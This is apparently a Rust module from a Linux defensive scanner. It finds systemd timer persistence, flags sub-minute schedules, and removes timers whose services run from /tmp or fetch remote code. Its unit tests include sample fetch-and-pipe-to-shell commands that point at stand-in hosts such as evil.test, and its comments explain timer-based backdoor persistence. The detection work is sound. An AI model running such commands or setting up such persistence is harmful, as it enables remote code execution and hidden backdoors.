//! Systemd timers used as persistence — an often-missed alternative to cron.
//!
//! Defenders frequently audit crontabs but overlook systemd timers, which can be
//! dropped in user or system unit directories and activated without any visible
//! crontab modification. A timer fires its paired `.service` file on a schedule;
//! the `ExecStart=` in that service file is where the backdoor payload lives.
//!
//! Two classes of findings are emitted:
//!
//! - **Critical**: a timer whose paired service has a suspicious `ExecStart=`
//!   (execution from `/tmp`, `/dev/shm`, fetch-and-exec, etc.). The unit is
//!   stopped, disabled, and both files are removed.
//! - **Medium**: a timer with a very short interval (< 60 seconds) even when the
//!   `ExecStart=` looks clean. Legitimate system timers rarely fire this often.

use std::path::{Path, PathBuf};

use crate::core::{
    DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_accounts,
    require_root,
};
use crate::core::scan::{references_untrusted_dir, suspicious_matches};

/// System-level directories that may contain `.timer` units.
const SYSTEM_TIMER_DIRS: &[&str] = &[
    "/etc/systemd/system",
    "/usr/lib/systemd/system",
    "/run/systemd/system",
    "/root/.config/systemd/user",
];

/// Walk all known timer directories and check every `.timer` file found.
pub fn run(ctx: &DefenderContext) -> Result {
    if require_root().is_err() {
        ctx.emit(Finding::new(
            Severity::Medium,
            "systemd_timers",
            "Not running as root — systemd timer check skipped",
            "Run as root to review systemd timer and service unit files.",
        ));
        return Err(DefenderError::NotRoot);
    }

    ctx.log_msg("[+] Checking systemd timers...");

    let mut dirs: Vec<PathBuf> = SYSTEM_TIMER_DIRS.iter().map(PathBuf::from).collect();

    // Per-user ~/.config/systemd/user/ directories
    if let Ok(accounts) = collect_accounts() {
        for account in &accounts {
            dirs.push(account.home.join(".config/systemd/user"));
        }
    }

    for dir in &dirs {
        if dir.is_dir() {
            scan_timer_dir(ctx, dir);
        }
    }

    ctx.log_msg("[✓] Systemd timer check complete");
    Ok(())
}

// ── Directory walker ──────────────────────────────────────────────────────────

fn scan_timer_dir(ctx: &DefenderContext, dir: &Path) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let timer_path = entry.path();
        let Some(file_name) = timer_path.file_name() else {
            continue;
        };
        let name_str = file_name.to_string_lossy();

        if !name_str.ends_with(".timer") {
            continue;
        }

        let Ok(timer_content) = std::fs::read_to_string(&timer_path) else {
            continue;
        };

        let unit_name = name_str.to_string();

        // Check timer file for short intervals
        check_timer_interval(ctx, &timer_path, &timer_content, &unit_name);

        // Find and check the paired service file
        let service_stem = &name_str[..name_str.len() - ".timer".len()];
        let service_path = dir.join(format!("{}.service", service_stem));

        if service_path.is_file() {
            if let Ok(svc_content) = std::fs::read_to_string(&service_path) {
                check_service_exec(ctx, &service_path, &svc_content, &timer_path, &unit_name);
            }
        }
    }
}

// ── Timer interval checks ─────────────────────────────────────────────────────

/// Emit a Medium finding for any timer that fires more often than once a minute.
fn check_timer_interval(ctx: &DefenderContext, timer_path: &Path, content: &str, unit_name: &str) {
    for raw_line in content.lines() {
        let trimmed = raw_line.trim();
        if trimmed.starts_with('#') || trimmed.is_empty() {
            continue;
        }

        let Some(eq_pos) = trimmed.find('=') else {
            continue;
        };
        let key = trimmed[..eq_pos].trim();
        let val = trimmed[eq_pos + 1..].trim();

        match key {
            "OnUnitActiveSec" | "OnBootSec" | "OnStartupSec" => {
                if let Some(secs) = parse_duration_secs(val) {
                    if secs < 60 {
                        ctx.log_msg(&format!(
                            "[!] Very frequent timer {}: {} = {} ({}s)",
                            unit_name, key, val, secs
                        ));
                        ctx.log_evidence_line(&timer_path.display().to_string(), trimmed);

                        ctx.emit(
                            Finding::new(
                                Severity::Medium,
                                "systemd_timers",
                                format!(
                                    "Very frequent timer: {} ({} = {}, {}s interval)",
                                    unit_name, key, val, secs
                                ),
                                format!(
                                    "timer: {}\n{} = {}\ninterval_secs: {}",
                                    timer_path.display(),
                                    key,
                                    val,
                                    secs
                                ),
                            )
                            .with_path(timer_path.to_path_buf())
                            .with_context("unit", unit_name.to_string())
                            .with_context("interval_setting", format!("{} = {}", key, val))
                            .with_context("interval_secs", secs.to_string())
                            .with_verdict(
                                Verdict::Investigate,
                                format!(
                                    "Timer {} fires every {} second(s). Legitimate system timers \
                                     rarely need sub-minute intervals. Verify this timer is \
                                     expected and check its paired service ExecStart.",
                                    unit_name, secs
                                ),
                            ),
                        );
                    }
                }
            }
            "OnCalendar" => {
                if oncalendar_is_frequent(val) {
                    ctx.log_msg(&format!(
                        "[!] High-frequency OnCalendar timer {}: {}",
                        unit_name, val
                    ));
                    ctx.log_evidence_line(&timer_path.display().to_string(), trimmed);

                    ctx.emit(
                        Finding::new(
                            Severity::Medium,
                            "systemd_timers",
                            format!(
                                "High-frequency calendar timer: {} (OnCalendar = {})",
                                unit_name, val
                            ),
                            format!(
                                "timer: {}\nOnCalendar = {}",
                                timer_path.display(),
                                val
                            ),
                        )
                        .with_path(timer_path.to_path_buf())
                        .with_context("unit", unit_name.to_string())
                        .with_context("OnCalendar", val.to_string())
                        .with_verdict(
                            Verdict::Investigate,
                            format!(
                                "Timer {} has a high-frequency OnCalendar expression ({}). \
                                 Investigate whether this schedule is expected.",
                                unit_name, val
                            ),
                        ),
                    );
                }
            }
            _ => {}
        }
    }
}

// ── Service ExecStart checks ──────────────────────────────────────────────────

/// Check a service unit for a suspicious `ExecStart=` line.
///
/// If found: log evidence, stop and disable the unit, then remove both the
/// `.service` and its paired `.timer` file.
fn check_service_exec(
    ctx: &DefenderContext,
    service_path: &Path,
    content: &str,
    timer_path: &Path,
    unit_name: &str,
) {
    for raw_line in content.lines() {
        let trimmed = raw_line.trim();
        if trimmed.starts_with('#') {
            continue;
        }

        let Some(exec_val) = trimmed.strip_prefix("ExecStart=") else {
            continue;
        };

        if !exec_is_suspicious(exec_val) {
            continue;
        }

        let reasons = suspicious_matches(exec_val);
        let from_untrusted = references_untrusted_dir(exec_val);

        ctx.log_msg(&format!(
            "[!] CRITICAL: Suspicious ExecStart in timer service {}: {}",
            unit_name, exec_val
        ));
        ctx.log_evidence_line(&service_path.display().to_string(), trimmed);
        ctx.log_evidence_file(service_path);

        // Stop and disable the timer unit
        ctx.run_remediation(&["systemctl", "stop", unit_name]);
        ctx.run_remediation(&["systemctl", "disable", unit_name]);

        // Remove both files
        let svc_removed = ctx.remove_path_logged(service_path);
        let tmr_removed = ctx.remove_path_logged(timer_path);

        let flag_summary = if reasons.is_empty() {
            format!(
                "execution from untrusted directory ({})",
                exec_val
                    .split('/')
                    .take(3)
                    .collect::<Vec<_>>()
                    .join("/")
            )
        } else {
            reasons.join(", ")
        };

        ctx.emit(
            Finding::new(
                Severity::Critical,
                "systemd_timers",
                format!(
                    "Backdoor timer service REMOVED: {} (ExecStart={})",
                    unit_name,
                    &exec_val[..exec_val.len().min(60)],
                ),
                format!(
                    "timer: {}\nservice: {}\nExecStart: {}\nflags: {}\nuntrusted_dir: {}\n\
                     service_removed: {}\ntimer_removed: {}",
                    timer_path.display(),
                    service_path.display(),
                    exec_val,
                    flag_summary,
                    from_untrusted,
                    svc_removed,
                    tmr_removed,
                ),
            )
            .with_path(service_path.to_path_buf())
            .with_context("unit", unit_name.to_string())
            .with_context("ExecStart", exec_val.to_string())
            .with_context("flags", flag_summary.clone())
            .with_context("service_removed", svc_removed.to_string())
            .with_context("timer_removed", tmr_removed.to_string())
            .with_verdict(
                Verdict::Remove,
                format!(
                    "Timer service {} had a suspicious ExecStart [{}]. \
                     The unit was stopped, disabled, and both the .service and .timer \
                     files were removed. Evidence and proof logged.",
                    unit_name, flag_summary,
                ),
            ),
        );

        // Only process the first suspicious ExecStart per service file.
        break;
    }
}

// ── Detection helpers ─────────────────────────────────────────────────────────

fn exec_is_suspicious(val: &str) -> bool {
    !suspicious_matches(val).is_empty() || references_untrusted_dir(val)
}

/// Detect an `OnCalendar=` value that fires more than once a minute.
///
/// Handles:
/// - `*:*:*` (every second)
/// - `*:*:00/N` (every N seconds, N < 60)
fn oncalendar_is_frequent(val: &str) -> bool {
    // *:*:* means every second
    if val.contains("*:*:*") {
        return true;
    }
    // Look for the seconds field after *:*: with a step divisor
    if let Some(pos) = val.rfind("*:*:") {
        let seconds_part = &val[pos + 4..];
        if let Some(slash_pos) = seconds_part.find('/') {
            // Grab the number after the slash, stopping at non-digit chars
            let n_str: String = seconds_part[slash_pos + 1..]
                .chars()
                .take_while(|c| c.is_ascii_digit())
                .collect();
            if let Ok(n) = n_str.parse::<u64>() {
                return n < 60;
            }
        }
    }
    false
}

/// Parse a systemd time span string into total seconds.
///
/// Handles single-component values (`10s`, `5m`, `1h`, `2min`) and simple
/// multi-component values (`1h 30m`). Returns `None` if the string cannot be
/// parsed at all.
fn parse_duration_secs(s: &str) -> Option<u64> {
    let s = s.trim();
    let mut total: u64 = 0;
    let mut found_any = false;

    for part in s.split_whitespace() {
        if let Some(secs) = parse_duration_part(part) {
            total = total.saturating_add(secs);
            found_any = true;
        } else if part.chars().all(|c| c.is_ascii_digit()) {
            // A bare number without a unit is treated as seconds.
            if let Ok(n) = part.parse::<u64>() {
                total = total.saturating_add(n);
                found_any = true;
            }
        }
    }

    if found_any { Some(total) } else { None }
}

/// Seconds for a single component like `10s`, `5min`, `2h`.
///
/// The `min` suffix must be checked before `m` to avoid misparse.
/// The `ms`/`us` suffixes map to 0 — sub-second timers are certainly < 60s.
fn parse_duration_part(s: &str) -> Option<u64> {
    if s.ends_with("min") {
        s[..s.len() - 3].parse::<u64>().ok().map(|n| n * 60)
    } else if s.ends_with("ms") || s.ends_with("us") {
        // Sub-second precision — 0 seconds, definitely triggers the < 60 check
        s[..s.len() - 2].parse::<u64>().ok().map(|_| 0)
    } else if s.ends_with('s') {
        s[..s.len() - 1].parse().ok()
    } else if s.ends_with('m') {
        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 60)
    } else if s.ends_with('h') {
        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 3600)
    } else if s.ends_with('d') {
        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 86400)
    } else {
        None
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // Duration parsing

    #[test]
    fn seconds_suffix_parsed() {
        assert_eq!(parse_duration_secs("10s"), Some(10));
        assert_eq!(parse_duration_secs("59s"), Some(59));
        assert_eq!(parse_duration_secs("60s"), Some(60));
    }

    #[test]
    fn minutes_suffix_parsed() {
        assert_eq!(parse_duration_secs("5m"), Some(300));
        assert_eq!(parse_duration_secs("2min"), Some(120));
        assert_eq!(parse_duration_secs("1min"), Some(60));
    }

    #[test]
    fn hours_suffix_parsed() {
        assert_eq!(parse_duration_secs("1h"), Some(3600));
        assert_eq!(parse_duration_secs("2h"), Some(7200));
    }

    #[test]
    fn days_suffix_parsed() {
        assert_eq!(parse_duration_secs("1d"), Some(86400));
    }

    #[test]
    fn bare_number_is_seconds() {
        assert_eq!(parse_duration_secs("10"), Some(10));
        assert_eq!(parse_duration_secs("60"), Some(60));
    }

    #[test]
    fn compound_duration_summed() {
        assert_eq!(parse_duration_secs("1h 30m"), Some(3600 + 1800));
        assert_eq!(parse_duration_secs("2h 15m 30s"), Some(7200 + 900 + 30));
    }

    #[test]
    fn subsecond_units_map_to_zero() {
        assert_eq!(parse_duration_secs("500ms"), Some(0));
        assert_eq!(parse_duration_secs("100us"), Some(0));
    }

    #[test]
    fn short_interval_detected() {
        assert!(parse_duration_secs("10s").map(|s| s < 60).unwrap_or(false));
        assert!(parse_duration_secs("30").map(|s| s < 60).unwrap_or(false));
        assert!(!parse_duration_secs("5m").map(|s| s < 60).unwrap_or(true));
        assert!(!parse_duration_secs("1h").map(|s| s < 60).unwrap_or(true));
    }

    #[test]
    fn unrecognised_value_returns_none() {
        assert!(parse_duration_secs("daily").is_none());
        assert!(parse_duration_secs("").is_none());
    }

    // ExecStart suspicious detection

    #[test]
    fn tmp_exec_is_suspicious() {
        assert!(exec_is_suspicious("/tmp/backdoor"));
        assert!(exec_is_suspicious("/dev/shm/payload.sh"));
        assert!(exec_is_suspicious("/var/tmp/.hidden"));
    }

    #[test]
    fn fetch_and_exec_is_suspicious() {
        assert!(exec_is_suspicious("bash -c 'curl http://c2/x | sh'"));
        assert!(exec_is_suspicious("/usr/bin/wget -O- http://evil.test | bash"));
    }

    #[test]
    fn legitimate_exec_is_clean() {
        assert!(!exec_is_suspicious("/usr/bin/systemd-tmpfiles --clean"));
        assert!(!exec_is_suspicious("/usr/lib/apt/apt.systemd.daily"));
        assert!(!exec_is_suspicious("/usr/sbin/logrotate /etc/logrotate.conf"));
    }

    // OnCalendar frequency

    #[test]
    fn every_second_is_frequent() {
        assert!(oncalendar_is_frequent("*:*:*"));
    }

    #[test]
    fn every_5_seconds_is_frequent() {
        assert!(oncalendar_is_frequent("*:*:00/5"));
        assert!(oncalendar_is_frequent("*:*:*/30"));
    }

    #[test]
    fn daily_and_weekly_are_not_frequent() {
        assert!(!oncalendar_is_frequent("daily"));
        assert!(!oncalendar_is_frequent("weekly"));
        assert!(!oncalendar_is_frequent("Mon *-*-* 04:00:00"));
    }

    #[test]
    fn hourly_is_not_frequent() {
        assert!(!oncalendar_is_frequent("hourly"));
        assert!(!oncalendar_is_frequent("*:00:00"));
    }
}
